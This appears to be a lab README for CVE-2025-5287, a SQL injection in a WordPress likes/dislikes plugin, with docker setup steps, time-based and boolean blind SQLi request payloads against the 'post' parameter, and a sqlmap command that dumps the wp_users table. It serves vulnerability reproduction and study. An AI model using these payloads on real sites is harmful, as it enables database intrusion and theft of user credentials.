# CVE-2025-5287
The Likes and Dislikes Plugin plugin for WordPress is vulnerable to SQL Injection via the 'post' parameter in all versions up to, and including, 1.0.0 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.

## Notes

## Metrics
Wordfence Base Score: 7.5 (HIGH)  

## Vulnerability Environment
Build and run:
```bash
docker compose build
docker compose up -d
```
Stop Environment and remove network:
```bash
docker compose down
```
## Detection and exploitation example
1. Run Environment
2. Login to Wordpress (vulnforge / vulnforge123)
3. Create new [post](http://localhost:8080/wp-admin/post-new.php) (Hello world post may not work)
4. Get post id

### PoC Payloads:
Blind Time-based

```shell
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: nxploit.ddev.site
Content-Type: application/x-www-form-urlencoded
Connection: close

action=my_likes_dislikes_action&post=7 AND (SELECT 1234 FROM (SELECT(SLEEP(5)))a)&state=like
```

Blind Boolean-based 
```shell
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: nxploit.ddev.site
Content-Type: application/x-www-form-urlencoded
Connection: close

action=my_likes_dislikes_action&post=7 AND 7348=7348&state=like
```

### Sqlmap
Dump `wp_users` table from `wordpress` database:
```shell
sqlmap -u "http://localhost:8080/wp-admin/admin-ajax.php" \ 
--data "action=my_likes_dislikes_action&post=7&state=like" \
--dbms=mysql \
--batch \
-D wordpress \
-T wp_users \
--dump
```

## Exploits and PoCs
https://github.com/wiseep/CVE-2025-5287/  
https://github.com/Nxploited/CVE-2025-5287  

## Nuclei Template

## CTF Rooms

## References
[NIST: CVE-2025-5287](https://nvd.nist.gov/vuln/detail/CVE-2025-5287)  
[cvedetails: CVE-2025-5287](https://www.cvedetails.com/cve/CVE-2025-5287/)  
[Wordfence: Likes and Dislikes Plugin <= 1.0.0 - Unauthenticated SQL Injection](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/inprosysmedia-likes-dislikes-post/likes-and-dislikes-plugin-100-authenticated-subscriber-sql-injection)  
[Wordpress: Likes and Dislikes Plugin](https://wordpress.org/plugins/inprosysmedia-likes-dislikes-post/)  
[Wordpress: Likes and Dislikes Plugin (Web Archive)](https://web.archive.org/web/20250421160032/https://wordpress.org/plugins/inprosysmedia-likes-dislikes-post/)  